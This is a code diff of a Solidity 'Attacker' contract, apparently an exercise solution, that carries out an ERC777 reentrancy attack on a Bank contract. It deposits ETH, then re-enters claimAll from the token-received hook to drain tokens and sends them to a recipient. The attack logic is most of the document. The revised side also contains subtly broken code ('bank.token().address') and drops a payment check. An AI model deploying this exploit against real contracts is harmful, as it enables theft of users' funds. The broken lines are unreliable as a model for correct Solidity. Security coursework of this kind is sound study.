@@ -10,24 +10,24 @@ contract Attacker is AccessControl, IERC777Recipient {
     bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
 	IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24); //This is the location of the EIP1820 registry
 	bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient"); //When someone tries to send an ERC777 contract, they check if the recipient implements this interface
-	uint8 public depth = 0;
-	uint8 public max_depth = 10; // 增加递归深度
+	uint8 depth = 0;
+	uint8 max_depth = 2;
 
 	Bank public bank; 
 
-	event Deposit(uint256 amount);
+	event Deposit(uint256 amount );
 	event Recurse(uint8 depth);
 
     constructor(address admin) {
         _grantRole(DEFAULT_ADMIN_ROLE, admin);
         _grantRole(ATTACKER_ROLE, admin);
-		_erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this)); //In order to receive ERC777 (like the MCITR tokens used in the attack) you must register with the EIP1820 Registry
+		_erc1820.setInterfaceImplementer(address(this),TOKENS_RECIPIENT_INTERFACE_HASH,address(this)); //In order to receive ERC777 (like the MCITR tokens used in the attack) you must register with the EIP1820 Registry
     }
 
 	function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
 		bank = Bank(bank_address);
         _grantRole(ATTACKER_ROLE, address(this));
-        _grantRole(ATTACKER_ROLE, address(bank.token()));
+        _grantRole(ATTACKER_ROLE, bank.token().address );
 	}
 
 	/*
@@ -35,17 +35,12 @@ contract Attacker is AccessControl, IERC777Recipient {
 	   amt is the amt of ETH the attacker will deposit initially to start the attack
 	*/
 	function attack(uint256 amt) payable public {
-        require(address(bank) != address(0), "Target bank not set");
+      require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
-        // 确保我们实际上存入了ETH，并启动攻击
-        require(msg.value >= amt, "Send enough ETH");
-        
-        // 先存入一些ETH到银行合约
-        bank.deposit{value: amt}();
-        emit Deposit(amt);
-        
-        // 通过调用claimAll来触发重入攻击
-        bank.claimAll();
+		bank.deposit{value: amt}();
+		depth = 0; // 重置递归深度
+		max_depth = 10; // 增加最大递归深度
+		bank.claimAll();
 	}
 
 	/*
@@ -54,7 +49,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 	*/
 	function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
 		ERC777 token = bank.token();
-		token.send(recipient, token.balanceOf(address(this)), "");
+		token.send(recipient,token.balanceOf(address(this)),"");
 	}
 
 	/*
@@ -69,23 +64,12 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
-        // 验证我们是从Bank合约的token接收的代币
-        if (msg.sender != address(bank.token())) {
-            return;
-        }
-        
-        // 我们只关心从Bank合约过来的代币
-        if (from != address(bank)) {
-            return;
-        }
-        
-        // 控制递归深度，防止栈溢出
-        if (depth < max_depth) {
-            depth++;
-            emit Recurse(depth);
-            
-            // 这是重入攻击的关键 - 在Bank更新我们的余额之前再次调用claimAll
-            bank.claimAll();
-        }
+		if (msg.sender == address(bank.token()) && from == address(bank)) {
+			if (depth < max_depth) {
+				depth++;
+				bank.claimAll();
+			}
+		}
 	}
+
 }
